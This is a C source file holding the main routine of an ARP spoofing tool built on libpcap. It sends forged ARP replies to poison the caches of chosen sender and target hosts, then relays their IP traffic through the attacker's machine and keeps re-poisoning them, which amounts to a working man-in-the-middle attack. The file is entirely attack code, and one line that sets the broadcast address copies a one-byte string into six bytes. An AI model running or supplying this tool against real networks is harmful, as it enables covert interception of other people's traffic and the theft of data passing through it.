#include "arp_spoof.h"

int main(int argc, char* argv[]) {
  if(argc <= 3 || argc % 2 == 1 || argc > 22) {
    usage();
    return -1;
  }
  int cnt = (argc - 2) / 2;
  uint8_t sender_ip[10][4], target_ip[10][4];
  for(int i = 0; i < cnt; i++) {
    //parse ip from argv
    parse_IP(argv[(2*i) + 2], sender_ip[i]);
    parse_IP(argv[(2*i) + 3], target_ip[i]);

    printf("%d sender ip: ", i);
    print_IP(sender_ip[i]);
    printf("%d target ip: ", i);
    print_IP(target_ip[i]);
  }

  //get my ip address
  uint8_t attacker_ip[4];
  char* dev = argv[1];
  if(get_attacker_IP(dev, attacker_ip) < 0) {
    perror("get attacker ip error");
    return -1;
  }
  printf("attacker ip: ");
  print_IP(attacker_ip);

  //get my mac address
  uint8_t attacker_mac[6];  
  if(get_attacker_mac(dev, attacker_mac) < 0) {
    perror("get attacker mac error");
    return -1;
  }
  printf("my mac address: ");
  print_mac(attacker_mac);

  //open pcap
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  uint8_t broadcast[6];
  memcpy(broadcast, "\xff", 6);
  uint8_t sender_mac[10][6];
  uint8_t target_mac[10][6];

  for(int i = 0; i < cnt ; i++) {
  //get sender mac
    send_arp(handle, REQUEST, attacker_ip, sender_ip[i], attacker_mac, broadcast);
    get_mac_by_ip(handle, sender_ip[i], sender_mac[i]);
    printf("%d sender mac address: ", i);
    print_mac(sender_mac[i]);

    //get target mac
    send_arp(handle, REQUEST, attacker_ip, target_ip[i], attacker_mac, broadcast);
    get_mac_by_ip(handle, target_ip[i], target_mac[i]);
    printf("%d target mac address: ", i);
    print_mac(target_mac[i]);
  }
  
  for(int i = 0; i < cnt; i++) {
    //arp spoof
    send_arp(handle, REPLY, target_ip[i], sender_ip[i], attacker_mac, sender_mac[i]);
    send_arp(handle, REPLY, sender_ip[i], target_ip[i], attacker_mac, target_mac[i]);
  }
  
  //relay and prevent arp recovery
  while(true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == -1 || res == -2) {
      fprintf(stderr, "packet capture error");
      break;
    }

    for(int i = 0; i < cnt; i++) {
      relay_ip_packet(packet, attacker_ip, attacker_mac, sender_mac[i], target_mac[i], handle, header->caplen);
      prevent_arp_recovery(packet, attacker_ip, sender_mac[i], handle, header->caplen);
    }
  }

  return 0;
}

